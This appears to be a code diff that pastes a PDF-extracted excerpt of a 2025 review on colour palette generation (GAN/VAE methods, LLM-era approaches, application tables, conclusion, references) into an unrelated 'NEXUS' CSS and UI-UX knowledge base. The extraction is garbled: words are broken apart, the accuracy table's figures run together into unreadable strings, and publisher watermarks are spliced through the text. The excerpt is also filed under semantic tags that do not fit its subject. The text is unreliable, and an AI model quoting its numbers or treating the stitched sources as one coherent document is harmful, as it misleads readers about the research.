+Moussa and Watanabe [75] (Figure 10)VA E: Used for learning low- dimensional
+representations of images.
+GAN: Used for generating realistic palettes.
+## Adversarial Training: The
+generator and discriminator improve
+through adversarial training.
+## Dual Model: Combines
+the strengths of VAE and
+GAN, capable of both feature
+extraction and high- quality
+palette generation.
+Diversity and Realism:
+Generates palettes that are both
+diverse and realistic, suitable for
+various application scenarios.
+FIGURE 8       |    Steps of image- driven harmonious color palette generation method for diverse information visualization [69].
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 260
+## Color Research & Application, 2025
+understanding  and  generating  a  diverse  range  of  languages.
+For instance, they are better at understanding contextual infor-
+mation  and  demonstrating  more  coherent  and  contextual  lan-
+guage comprehension abilities. Additionally, with the increase
+in model size and the unification of technology, large language
+models (LLMs) like GPT- 3 [82] have emerged, integrating var-
+ious  language  understanding  and  generation  tasks  into  a  uni-
+fied framework.
+The  recent  advent  of  AI  models  such  as  ChatGPT  [83]  and
+GP T- 4  [84] signifies a notable advancement in AI's ability to un-
+derstand  and  follow  human  intentions.  These  models  not  only
+excel in various language tasks but also interact better with hu-
+mans, showing an understanding of and adaptability to human
+instructions,  laying  a  new  foundation  for  the  future  develop-
+ment of artificial intelligence. The era of large models provides
+us  with  powerful  tools  for  processing  and  generating  complex
+data, including images, which can be applied to the creation of
+image color palettes. Some studies have already started to focus
+on the applications of this aspect.
+A  study  carried  out  by  Li  et  al.  addressed  the  often  overlooked
+cultural aspects in algorithmic color palette generation and col-
+orization [85]. It emphasizes the unique aesthetic and semantic
+characteristics of the Chinese Youth Subculture (CYS), a vibrant
+group among the Gen Z population in China. This study devel-
+opment of a unique open dataset inspired by CYS, incorporating
+images,  color  palettes,  text,  and  categories,  the  introduction  of
+a multi- modal generative architecture for culture- inspired color
+palette generation and colorization, and the creation of a demo
+system  that  uses  human-  in-  the-  loop  principles  for  constant
+feedback and system evolution.
+Another research completed by Qiu, Wang, and Otani presented
+a  multimodal  masked  color  model  to  provide  text-  aware  color
+recommendations  in  graphic  document  design  [86]. The model
+integrates  both  color  and  textual  contexts  using  self-  attention
+and cross- attention networks and is applicable for color palette
+completion  and  full  palette  generation.  The  proposed  method-
+ology  presents  numerous  key  benefits.  It  implements  a  multi-
+modal  masked  color  model  that  merges  color  and  CLIP-  based
+textual representations, making it suitable for both color palette
+completion and complete palette generation. The model outper-
+forms existing methods in terms of precision, color distribution,
+user  engagement,  color  variety,  and  likeness  to  authentic  color
+palettes,  as  demonstrated  by  thorough  experiments  and  user
+studies across different design scenarios.
+In  summary,  the  latest  advancements  in  artificial  intelligence
+have sparked numerous ideas and methods that show great po-
+tential, especially in the realm of generating image color palettes
+(as  shown  in  Figure 11).  With  the  rapid  pace  of  technological
+progress, we can expect even more groundbreaking methods to
+emerge in this field.
+FIGURE 9      |    The overall workflow of the proposed color palette extraction: (a) Generating feature maps from RGBY input image, (b) generating
+the color palette using GAN, (c) fine- tuning the chroma through reinforcement learning, and (d) outputting the color palette [72].
+TABLE 4    |    Accuracy comparison of the proposed method at different
+numbers of correctly identified color blocks [72].
+## Methods
+The number of
+correct  color- patch
+## 345
+K- mea n  cluster ing0.62140.58240.5203
+ColorMind0.73210.65320.6252
+Backbone- EDSR  without
+fine- tuning
+## 0.92520.88340.8585
+Backbone- EDSR  with
+fine- tuning
+## 0.93540.89220.8712
+Backbone- MDSR  without
+fine- tuning
+## 0.95040.90240.8801
+Backbone- MDSR  with
+fine- tuning
+## 0.95780.91260.8968
+Backbone- RDN  without
+fine- tuning
+## 0.97020.92230.9013
+Backbone- RDN  with
+fine- tuning
+## 0.97450.92720.9180
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 261
+FIGURE 10    |    CNN- VAE- LSTM- GAN color palette generation network architecture [75].
+TABLE 5    |    Classification of the current application of color palette.
+ApplicationsCharacteristics of methodsTrend of development
+Graphic and interior design [2, 12, 43]Applying color palettes to brand
+packaging, furniture arrangement
+and color matching, emphasizing
+the visual and emotional
+effects of color in design.
+Digital technology and AI may be used more
+to optimize the design process, achieving
+personalized and efficient color selection.
+Medical imaging [9, 16]Color palettes enhance the
+clarity and interpretability
+of medical images.
+Deep learning will be integrated to improve
+the accuracy and efficiency of image analysis.
+Fashion industry [13]Using color palettes to generate and
+analyze fashion industry trends,
+through machine learning to
+process fashion collection images.
+We may see more applications that
+combine big data and trend forecasting,
+in order to more accurately predict
+and respond to market changes.
+Data security and encryption [10, 27]The application of color palettes in
+data hiding and image encryption,
+highlighting its importance in
+the field of information security.
+More advanced encryption technologies will
+be developed to protect sensitive information.
+Information visualization [14, 69]Using color palettes in molecular
+visualization and diversified
+information visualization,
+emphasizing the necessity
+of proper color selection.
+More research will focus on user
+interface friendliness and accessibility,
+making information easier to
+understand and communicate.
+Art and color theory [1, 41, 42]Explore the importance of color in
+artistic expression and aesthetics.
+Color may be studied more deeply in
+relation to human emotions and culture.
+Image pattern recognition [21–24, 26]Apply color theory to image
+recognition and pattern analysis.
+Image pattern recognition may
+achieve significant improvements
+in accuracy and efficiency.
+Image recoloring [8, 73, 74]Use advanced technologies to
+change the color style of images,
+for beautification, artistic
+creation or data visualization.
+Image recoloring techniques may be
+applied more to multimedia, entertainment
+and advertising industries.
+Color quantization [11, 15, 17, 18, 28, 72]Color quantization processing of
+images, for image compression,
+optimization and analysis.
+Color quantization techniques
+may play a greater role in image
+storage and transmission.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 262
+## Color Research & Application, 2025
+## 6   |   Conclusion
+In this review, we provide an overview of color palette extraction
+research,  introducing  the  main  color  palette  generation  algo-
+rithms  and  their  applications.  Color  palette  extraction  is  an  im-
+portant  research  area  in  computer  vision  and  image  processing,
+with  wide-  ranging  applications  in  image  retrieval,  image  seg-
+mentation, image compression, image editing, and artistic design.
+Many  studies  [8–12]  highlight  the  role  of  advanced  compu-
+tational  methods  like  machine  learning,  deep  learning,  and
+data- driven approaches in enhancing color palette generation
+and image processing. Some researches [1, 2, 41–43] focus on
+the  application  of  color  palettes  in  artistic  and  design  con-
+texts,  emphasizing  their  importance  in  conveying  aesthetic
+and  emotional  content.  Many  papers  [16 –20]  delve  into  the
+exploration and utilization of various color spaces for effective
+color  segmentation  and  palette  generation.  Development  of
+automated and interactive tools for color palette generation is
+a common theme [44–47, 73, 74], facilitating easier and more
+efficient  color  selection  for  non-  experts.  Although  computer-
+based  color  palette  generation  methods  have  many  advan-
+tages, they still have limitations.
+- Limitations  of  training  data.  Methods  based  on  statis-
+tics,  artificial  neural  networks,  and  deep  learning  require
+large  and  representative  training  datasets.  Insufficient  or
+unrepresentative  training  data  can  lead  to  generated  pal-
+ettes that are not suitable for practical applications.
+- Algorithm  complexity  and  computational  resources.
+Methods  based  on  artificial  neural  networks  and  deep
+learning  require  significant  computational  resources  and
+time. These methods often rely on high- performance com-
+puters  or  GPUs  for  model  training.  Additionally,  these
+methods  have  higher  algorithmic  complexity  and  longer
+training times.
+- Limitations in color f lexibility. Automated palette gen-
+eration  methods  often  cannot  provide  the  same  level  of
+flexibility  and  personalization  as  manual  methods.  These
+methods typically generate a set of colors that meet certain
+requirements but may struggle to adjust and optimize them
+for specific scenarios.
+- Color  perception  issues.  Automatically  generated  pal-
+ettes may not fully meet the requirements of human visual
+perception,  particularly  in  terms  of  contrast,  brightness,
+and  saturation.  These  issues  can  result  in  generated  pal-
+ettes  that  do  not  match  the  intended  application  or  lack
+aesthetic appeal. Future research directions include more
+accurate  and  robust  color  palette  extraction  algorithms,
+deep  learning-  based  palette  extraction,  and  multi-  modal
+palette extraction. Additionally, with the continuous devel-
+opment of computer hardware and software technologies,
+there  are  promising  prospects  for  color  palette  extraction
+in real- time image processing and mobile applications.
+Based  on  the  investigation  of  the  development  of  color  palette
+generation  and  its  application,  we  believe  that  computer-  based
+color palette generation methods are a rapidly evolving field, and
+future trends may encompass the following aspects.
+- Better datasets. Improved training datasets can enhance
+the  performance  of  methods  based  on  statistics,  artificial
+FIGURE 11       |    Some innovative methods for color palette generation in the AI era.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 263
+neural  networks,  and  deep  learning.  Increasing  the  scale
+and quality of training datasets can lead to better algorithm
+performance.
+- More  efficient  algorithms.  As  computer  technology  ad-
+vances,  future  algorithms  will  become  more  efficient  and
+faster. Parallel computing and distributed computing can be
+employed  to  accelerate  the  training  and  palette  generation
+processes.
+- Improved  color  perception.  Future  palette  generation
+methods will pay more attention to color perception issues
+and  human  visual  requirements.  Generated  palettes  will
+better  align  with  practical  application  scenarios  and  aes-
+thetic considerations.
+- Personalization  and  f lexibility.  Future  palette  genera-
+tion  methods  will  focus  on  personalization  and  flexibility,
+allowing adjustments and optimizations based on different
+application scenarios and user needs. This will result in pal-
+ettes that better meet specific requirements.
+The investigation has revealed the multidisciplinary nature of
+color palette generation that blends art, psychology, technology,
+and  practical  application.  The  push  towards  automation  and
+user-  friendly  tools  reflects  a  democratization  of  color  design,
+making  it  accessible  beyond  professional  designers.  However,
+the challenge remains in balancing aesthetic appeal with func-
+tionality, especially in specialized fields like medical imaging
+or data encryption. Moreover, the progress of AI and machine
+learning in recent achievements marks a significant leap in the
+capability  to  generate  and  analyze  color  palettes  [4,  6,  7,  65],
+offering  more  personalized  and  context-  aware  solutions.  This
+evolution  reflects  the  ongoing  trend  of  integrating  advanced
+computational methods into creative and analytical processes.
+Overall,  the  research  on  color  palette  generation  is  highly
+dynamic,  continuously  evolving  with  technological  advance-
+ments and expanding its application across various domains.
+## Author Contributions
+Ya fa n Gao: conceptualization (equal), investigation, writing – original
+draft preparation. Jinxing Liang: conceptualization (equal), conceive
+the  structure  of  the  article,  supervision,  writing  –  review  and  editing.
+Jie Ya ng: conceptualization (equal), conceived the structure of the arti-
+cle, supervision, writing – review and editing.
+Conflicts of Interest
+The authors declare no conflicts of interest.
+## Data Availability Statement
+Data sharing not applicable to this article as no datasets were generated
+or analysed during the current study.
+## References
+- W. Kandinsky, Concerning the Spiritual in Art (New York, US: Dover
+## Publications, 2012).
+- S. Hart and J. Murphy, The New Wealth Creators (New York, US: New
+## York University Press, 1998).
+-  Y.  Chen,  L.  Yu,  S.  Westland,  and  V.  Cheung,  “Investigation  of  De-
+signers'  Colour  Selection  Process,”  Color  Research  and  Application  46
+## (2021): 557–565.
+-  D.  Cohen-  Or,  O.  Sorkine,  R.  Gal,  T.  Leyvand,  and  Y.  Q.  Xu,  “Color
+Harmonization,” in ACM SIGGR APH 2006 Papers (New York, US: As-
+sociation for Computing Machinery, 2006), 624–630.
+- L. C. Ou, M. R. Luo, A. Woodcock, and A. Wright, “A Study of Colour
+Emotion and Colour Preference. Part I: Colour Emotions for Single Co-
+lours,” Color Research & Application 29, no. 3 (2004): 232–240.
+- J. Cho, S. Yun, K. Mu Lee, and J. Y. Choi, “Palettenet: Image Recolor-
+ization With Given Color Palette,” in Proceedings of the IEEE Conference
+on  Computer  Vision  and  Pattern  Recognition  Workshops  (New  Jersey,
+US: IEEE Xplore Digital Library, 2017), 62–70.
+-    D. Xia Zixun and L. X. Zheng jun, “Representative Palette Extraction
+and Image Recoloring,” Journal of Computer- Aided Design & Computer
+Graphics 35, no. 5 (2023): 738–748.
+-  S.  Yan,  S.  Xu,  W.  Yang,  and  S.  Zhang,  “Image  Recoloring  Based  on
+Fast  and  Flexible  Palette  Extraction,”  Multimedia  Tools  and  Applica-
+tions 1–18 (2023): 47793–47810.
+-  S.  Shaikh,  N.  Akhter,  and  R.  Manza,  “Medical  Image  Processing  of
+Thermal Images in Light of Applied Color Palettes.”
+- M. Yu, H. Yao, C. Qin, and X. Zhang, “Reversible data hiding in pal-
+ette images,” IEEE Transactions on Circuits Systems for Video Technol-
+ogy 33 (2022): 6 4 8– 660.
+-  M.  Frackiewicz,  H.  Palus,  and  D.  Prandzioch,  “Superpixel-  Based
+PSO Algorithms for Color Image Quantization,” Sensors 23 (2023): 1108.
+-  B.  H.  Park,  K.  Son,  and  K.  H.  Hyun,  “Interior  Design  Network  of
+Furnishing and Color Pairing With Object Detection and Color Analy-
+sis Based on Deep Learning,” in International Conference on Computer-
+Aided  Architectural  Design  Futures  (California,  US:  Springer,  2021),
+## 237–249.
+- A. Han, J. Kim, and J. Ahn, “Color Trend Analysis Using Machine
+Learning  With  Fashion  Collection  Images,”  Clothing  and  Textiles  Re-
+search Journal 4 0 (2022): 308–32 4.
+-  L.  Garrison  and  S.  Bruckner,  “Considering  Best  Practices  in  Color
+Palettes  for  Molecular  Visualizations,”  Journal  of  Integrative  Bioinfor-
+matics 19 (2022): 20220016.
+- R. C. Gonzalez and R. E. Woods, Digital Image Processing (New Jer-
+sey, US: Pearson Education, 2002).
+- J. Patel and R. Anand, “Color Image Segmentation for Medical Im-
+ages Using l*a*b* Color Space,” IOSR Journal of Electronics and Commu-
+nication Engineering 1 (2012): 2 4 – 45.
+- E. Chavolla, D. Zaldivar, E. Cuevas, and R. Rojas, “Color Spaces Ad-
+vantages and Disadvantages in Image Color Clustering Segmentation,”
+International  Journal  of  Advanced  Computer  Science  and  Applications
+## 9 (2018): 1–10.
+- L. Velho, A. C. Frery, and J. Gomes, Image Processing for Computer
+Graphics and Vision (London, UK: Springer, 2009).
+-  G.  Finlayson  and  R.  Xu,  “Illuminant  and  Gamma  Comprehensive
+Normalisation in Logrgb Space,” Pattern Recognition Letters 24 (2003):
+## 1679–1690.
+-  E.  Blanco,  M.  Mazo,  L.  Bergasa,  and  S.  Palazuelos,  “A  Method  to
+Increase Class Separation in the HS Plane for Color Segmentation Ap-
+plications,” in 2007 IEEE International Symposium on Intelligent Signal
+Processing (New Jersey, US: IEEE, 2007), 1–6.
+## 21. T. Kuremoto, Y. Kinoshita, L. B. Feng, S. Watanabe, K. Kobayashi,
+and M. Obayashi, “A Gesture Recognition System With Retina- v1 Model
+and  One-  Pass  Dynamic  Programming,”  Neurocomputing  116  (2013):
+## 291–300.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 264
+## Color Research & Application, 2025
+-  H.  Yanga,  Y.  Wanga,  Q.  Wanga,  and  X.  Zhanga,  “Ls-  Svm  Based
+Image  Segmentation  Using  Color  and  Texture  Information,”  Jour-
+nal  of  Visual  Communication  and  Image  Representation  23  (2012):
+## 1095–1112.
+-  S.  Khaled,  M.  Saiful  Islam,  M.  G.  Rabbani,  et  al.,  “Combinatorial
+Color Space Models for Skin Detection in Sub- Continental Human Im-
+ages,”  in  Visual  Informatics:  Bridging  Research  and  Practice  (Berlin,
+## Heidelberg: Springer, 2009), 532–542.
+-  W.  Liu,  L.  Wang,  and  Z.  Yang,  “Application  of  Self-  Adapts  to  RGB
+Threshold Value for Robot Soccer,” in 2010 International Conference on
+Machine Learning and Cybernetics, vol. 2 (New Jersey, US: IEEE, 2010),
+## 599–603.
+- M. R. Luo and C. Li, “CIECAM02 and Its Recent Developments,” in
+Advanced Color Image Processing and Analysis (New York, US: Springer,
+## 2 013), 19 –58.
+-  M.  Tokumaru,  N.  Muranaka,  and  S.  Imanishi,  “Color  Design  Sup-
+port  System  Considering  Color  Harmony,”  in  Proceedings  of  the  2002
+IEEE International Conference on Fuzzy Systems, vol. 1 (New Jersey, US:
+## IEEE, 2002), 378–383.
+- V. Oleg and J. Buchanan, “The Local k- Means Algorithm for Colour
+Image  Quantization,”  in  Graphics  Interface  (Toronto,  Canada:  Cana-
+dian Information Processing Society, 1995), 128.
+-  P.  Scheunders,  “A  Comparison  of  Clustering  Algorithms  Applied
+to  Color  Image  Quantization,”  Pattern  Recognition  Letters  18  (1997):
+## 1379–1384.
+- X. Wan and C. Kuo, “A New Approach to Image Retrieval With Hier-
+archical Color Clustering,” IEEE Transactions on Circuits and Systems
+for Video Technology 8 (1998): 628–643.
+- N. Ponomarenko, F. Battisti, K. Egiazarian, J. Astola, and V. Lukin,
+“Metrics  Performance  Comparison  for  Color  Image  Database,”  Fourth
+International  Workshop  on  Video  Processing  and  Quality  Metrics  for
+## Consumer Electronics 27 (2009): 1–6.
+-  D.  Lowe,  “Distinctive  Image  Features  From  Scale-  Invariant  Key-
+points,” International Journal of Computer Vision 60 (2004): 91–110.
+-  G.  Pass,  R.  Zabih,  and  J.  Miller,  “Comparing  Images  Using  Color
+Coherence  Vectors,”  in  Proceedings  of  the  Fourth  ACM  International
+Conference  on  Multimedia  (New  York,  US:  Association  for  Computing
+## Machinery, 1997), 65–73.
+-  D.  Nister  and  H.  Stewenius,  “Scalable  Recognition  With  a  Vocab-
+ulary  Tree,”  in  2006  IEEE  Computer  Society  Conference  on  Computer
+Vision  and  Pattern  Recognition,  vol.  2  (New  Jersey,  US:  IEEE,  2006),
+## 2161–2168.
+-  M.  Melgosa,  A.  Trémeau,  and  G.  Cui,  “Colour  difference  evalua-
+tion,” in Advanced Color Image Processing and Analysis (New York, US:
+## Springer, 2013), 59–79.
+-  K.  Witt,  “CIE  Guidelines  for  Coordinated  Future  Work  on  Indus-
+trial Colour- Difference Evaluation,” Color Research and Application 20
+## (1995): 399–403.
+-  G.  Cui,  M.  Luo,  B.  Rigg,  and  W.  Li,  “Colour-  Difference  Evaluation
+Using CRT Colours. Part I: Data Gathering and Testing Colour Differ-
+ence Formulae,” Color Research and Application 26 (2001): 394–402.
+-  M.  Luo,  G.  Cui,  and  B.  Rigg,  “The  Development  of  the  CIE  2000
+Colour- Difference Formula: CIEDE2000,” Color Research and Applica-
+tion 26 (2001): 340–350.
+-  Q.  Pan  and  S.  Westland,  “Comparative  Evaluation  of  Color  Differ-
+ences Between Color Palettes,” in Proceedings of the IS&T Color and Im-
+aging Conference (Virginia, US: Springfield, 2018), 110–115.
+- J. Yang, Y. Chen, S. Westland, and K. Xiao, “Predicting Visual Sim-
+ilarity  Between  Colour  Palettes,”  Color  Research  and  Application  45
+## (2020): 1129–1140.
+- S. Westland, G. Finlayson, P. Lai, et al., “A Computational Method
+for  Predicting  Color  Palette  Discriminability,”  Color  Research  and  Ap-
+plication 49 (2024): 1–9.
+- J.  Albers, Interaction  of  Color  (Connecticut,  US:  Yale  University
+## Press, 1975).
+-  L.  Eiseman  and  K.  Recker,  Pantone  Guide  to  Communicating  With
+Color (New York, US: Grafix Press, 2000).
+- A. Morioka, S. Adams, and T. Stone, Color Design Workbook: A Real-
+World Guide to Using Color in Graphic Design (New York, US: Rockport
+## Publishers, 2006).
+-  J.  Delon,  A.  Desolneux,  J.  Lisani,  and  A.  Petro,  “Automatic  Color
+Palette,”  in  IEEE  International  Conference  on  Image  Processing,  2005.
+ICIP 2005, vol. 2 (New Jersey, US: IEEE, 2005), 706–709.
+-  J.  Delon,  A.  Desolneux,  J.  Lisani,  and  A.  Petro,  “Automatic  Color
+Palette,” Inverse Problems and Imaging 1 (2007): 265–287.
+-  B.  Morse,  D.  Thornton,  Q.  Xia,  and  J.  Uibel,  “Image-  Based  Color
+Schemes,” in IEEE International Conference on Image Processing, 2007.
+ICIP 2007, vol. 3 (New Jersey, US: IEEE, 2007), 497–500.
+-  J.  MacQueen,  “Some  Methods  for  Classification  and  Analysis  of
+Multivariate Observations,” in Proceedings of the Fifth Berkeley Sympo-
+sium on Mathematical Statistics and Probability, vol. 1 (California, US:
+University of California Press, 1967), 281–297.
+- W. Barbakh, W. Ying, and F. Colin, Non- standard Parameter Adap-
+tation for Exploratory Data Analysis (Scotland: University of the West of
+## Scotland, 2009).
+## 49. J. Bezdek, Pattern Recognition With Fuzzy Objective Function Algo-
+rithms (Massachusetts, US: Kluwer Academic, 1981).
+- J. Bezdek, L. Hall, and L. Clarke, “Review of MR Image Segmenta-
+tion Techniques Using Pattern Recognition,” Medical Physics 20 (1993):
+## 1033–1048.
+-  M.  Ahmed,  S.  Yamany,  N.  Mohamed,  A.  Farag,  and  T.  Moriarty,
+“A  Modified  Fuzzy  c-  Means  Algorithm  for  Bias  Field  Estimation  and
+Segmentation of MRI Data,” IEEE Transactions on Medical Imaging 21
+## (20 02): 193 –199.
+-  L.  Szilagyi,  Z.  Benyo,  S.  Szilagyi,  and  H.  Adam,  “MR  Brain  Image
+Segmentation Using an Enhanced Fuzzy c- Means Algorithm,” in 2003
+25th Annual International Conference of the IEEE Engineering in Medi-
+cine and Biology Society (IEEE Cat. No. 03CH37439), vol. 3 (New York,
+## US: IEEE, 2003), 724–726.
+-  S.  Chen  and  D.  Zhang,  “Robust  Image  Segmentation  Using  Fcm
+With Spatial Constraints Based on New Kernel- Induced Distance Mea-
+sure,” IEEE Transactions on Systems, Man, Cybernetics, Part B (Cyber-
+net ics) 34 (2004): 1907–1916.
+- F. Zhao, “Fuzzy Clustering Algorithms With Self- Tuning Non- local
+Spatial  Information  for  Image  Segmentation,”  Neurocomputing  106
+## (2013): 115–125.
+-  S.  Krinidis  and  V.  Chatzis,  “A  Robust  Fuzzy  Local  Information  c-
+Means Clustering Algorithm,” IEEE Transactions on Image Processing
+## 19 (2010): 1328–1337.
+- M. Gong, Z. Zhou, and J. Ma, “Change Detection in Synthetic Aper-
+ture Radar Images Based on Image Fusion and Fuzzy Clustering,” IEEE
+Transactions on Image Processing 21 (2012): 2141–2151.
+-  D.  Du  and  C.  Wu,  “Research  on  Kernel  Space  Intuitionistic  Fuzzy
+Local  c-  Means  Clustering  Algorithm,”  International  Journal  of  Com-
+puter Engineering and Applications 52 (2 016): 171–178.
+- M. Ghorbani, “Maximum Entropy- Based Fuzzy Clustering by Using
+LT- Noitu  Space,” Turkish Journal of Mathematics 29 (2014): 431–438.
+-  Y.  Liu,  H.  Wang,  J.  Liu,  et  al.,  “Feature  Weighted  Fuzzy  c-  Ordered
+Means Clustering Algorithm,” Journal of Henan Polytechnic University
+(Natural Science) 38 (2019): 123–130.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 265
+-  S.  Kohonen,  “Self-  Organized  Formation  of  Topologically  Correct
+## Feature Maps,” Biological Cybernetics 43 (1982): 59–69.
+- S. Ong, N. Yeo, and K. Lee, “Segmentation of Color Images Using a
+Two- Stage  Self- Organizing  Network,” Image and Vision Computing 20
+## (20 02): 279 –289.
+- C. Chang, P. Xu, R. Xiao, et al., “New Adaptive Color Quantization
+Method Based on Self- Organizing Maps,” IEEE Transactions on Neural
+## Networks 16 (2005): 237–249.
+-  N.  Yeo,  K.  Lee,  Y.  Venkatesh,  et  al.,  “Colour  Image  Segmentation
+Using  the  Self-  Organizing  Map  and  Adaptive  Resonance  Theory,”
+Image and Vision Computing 23 (2005): 1060 –1079.
+-   C.   Wang,   C.   Lee,   and   C.   Hsieh,   “Sample-   Size   Adaptive   Self-
+Organization  Map  for  Color  Image  Quantization,”  Pattern  Recognition
+## Letters 28 (2007): 1616 –1629.
+-  G.  Mathur  and  H.  Purohit,  “Performance  Analysis  of  Color  Image
+Segmentation  Using  k-  Means  Clustering  Algorithm  in  Different  Color
+Spaces,” International  Journal  of  Computer  Engineering  and  Applica-
+tions 52 (2 014): 171–178.
+- Y. Hu, M. Lee, and P. Tsai, “Colour Palette Generation Schemes for
+## Colour Image Quantization,” Imaging Science Journal 57 (2009): 28–37.
+-  F.  Shmmala  and  W.  Ashour,  “Color  Based  Image  Segmentation
+Using Different Versions of k- Means in Two Spaces,” International Jour-
+nal of Computer Engineering and Applications 52 (2 013): 171–178.
+-  S.  Arumugadevi  and  V.  Seenivasagam,  “Comparison  of  Clustering
+Methods for Segmenting Color Images,” Indian Journal of Science and
+## Technology 8 (2015): 670.
+-  S.  Liu,  M.  Tao,  Y.  Huang,  et  al.,  “Image-  Driven  Harmonious  Color
+Palette Generation for Diverse Information Visualization,” IEEE Trans-
+actions on Visualization Computers and Graphics 28 (2022): 1–11.
+-  W.  Leow  and  R.  Li,  “The  Analysis  and  Applications  of  Adaptive-
+Binning Color Histograms,” Computer Vision and Image Understanding
+## 94 (2004): 67–91.
+- A. Ahmad and L. Dey, “A k- Mean Clustering Algorithm for Mixed
+Numeric  and  Categorical  Data,”  Data  &  Knowledge  Engineering  63
+## (2 0 0 7): 5 03 –527.
+- S. Kim and S. Kang, “Gan- Based Color Palette Extraction System by
+Chroma Fine- Tuning With Reinforcement Learning,” Journal of Semi-
+conductors 2 (2021): 125–129.
+-  J.  Cho,  S.  Yun,  K.  Lee,  and  J.  Choi,  “Palettenet:  Image  Recoloriza-
+tion  With  Given  Color  Palette,”  in  Proceedings  of  the  IEEE  Conference
+on Computer Vision and Pattern Recognition Workshops (New York, US:
+## IEEE, 2017), 1058–1066.
+-  W.  Cho,  H.  Bahng,  D.  K.  Park,  et  al.,  “Text2colors:  Guiding  Image
+Colorization  Through  Text-  Driven  Palette  Generation,”  arXiv   1812
+## (2 018): 1–12 .
+-  A.  Moussa  and  H.  Watanabe,  “Generation  and  Extraction  of  Color
+Palettes With Adversarial Variational Auto- Encoders,” in Proceedings of
+Sixth International Congress on Information and Communication Tech-
+nology (New York, US: Springer, 2022), 889–897.
+- Y. Alami Mejjati, C. Richardt, J. Tompkin, D. Cosker, and K. I. Kim,
+“Unsupervised   Attention- Guided   Image- To- Image   Translation,” Ad-
+vances in Neural Information Processing Systems 31 (2018): 1–11.
+- J. Devlin, M. Chang, K. Lee, and K. Toutanova, “Bert: Pre- Training
+of  Deep  Bidirectional  Transformers  for  Language  Understanding,”  in
+Proceedings of the 2019 Conference of the North American Chapter of the
+Association for Computational Linguistics: Human Language Technolo-
+gies  (New  York,  US:  Association  for  Computational  Linguistics,  2019),
+## 4171– 4186.
+- Y. Liu, “Roberta: A Robustly Optimized Bert Pretraining Approach,”
+arXiv 33 (2019): 1877–1901.
+-  C.  Raffel,  N.  Shazeer,  A.  Roberts,  et  al.,  “Exploring  the  Limits  of
+Transfer  Learning  With  a  Unified  Text-  To-  Text  Transformer,”  Journal
+of Machine Learning Research 21 (2020): 1–67.
+-  P.  He,  X.  Liu,  J.  Gao,  and  W.  Chen,  “Deberta:  Decoding-  Enhanced
+Bert  With  Disentangled  Attention,”  in  International  Conference  on
+Learning  Representations  (Addis  Ababa,  Ethiopia:  International  Con-
+ference on Learning Representations, 2021).
+- A. Radford, J. Wu, R. Child, D. Luan, D. Amodei, and I. Sutskever,
+“Language  Models  Are  Unsupervised  Multitask  Learners,”  OpenAI
+## Blog 1 (2019): 9.
+-  T.  Brown,  B.  Mann,  N.  Ryder,  et  al.,  “Language  Models  Are  Few-
+Shot Learners,” in Advances in Neural Information Processing Systems,
+vol. 33 (New York, US: Neural Information Processing Systems Founda-
+tion, 2020), 1877–1901.
+- OpenAI, “Chatgpt” (2022), https:// openai. com/ blog/ chatg pt/ .
+-  OpenAI,  “Gpt-  4  Technical  Report”  (2023),  https:// ar xiv. org/ abs/
+## 2303. 08774 .
+- Y. Li, Y. Zhang, J. Wang, Y. Wang, and J. Zhang, “Culture- Inspired
+Multi-  Modal  Color  Palette  Generation  and  Colorization:  A  Chinese
+Youth Subculture Case,” in 2021 IEEE 4th International Conference on
+Multimedia  Information  Processing  and  Retrieval  (MIPR)  (New  Jersey,
+## US: IEEE, 2021), 382–385.
+-  Q.  Qiu,  X.  Wang,  and  M.  Otani,  “Multimodal  Color  Recommenda-
+tion in Vector Graphic Documents,” in Proceedings of the 31st ACM In-
+ternational Conference on Multimedia (New York, US: ACM, 2023).
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, api]
+
 ### 📘 KNOWLEDGE: NEXUS_CSS.MD
 
 # CSS: Modern Architecture and Performance
@@ -14293,7 +27463,7 @@ A screen reader would read it out as "Save save".
 
 ### 📘 KNOWLEDGE: NEXUS_DISTILLATION_UI-UX.MD
 
-## 🎓 UI-UX WISDOM DISTILLATION [v1100] - 26/05/2026
+## 🎓 UI-UX WISDOM DISTILLATION [v5391] - 26/05/2026
 > **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights
 
 ### 📄 Accessible Error Announcement
@@ -15151,6 +28321,17 @@ Use the `::view-transition-gro...
 - [Related Standards](NEXUS_CORE_PRINCIPLES.md)
 
 ---
+### 📄 NEXUS — Post-Stabilization Hardening Plan
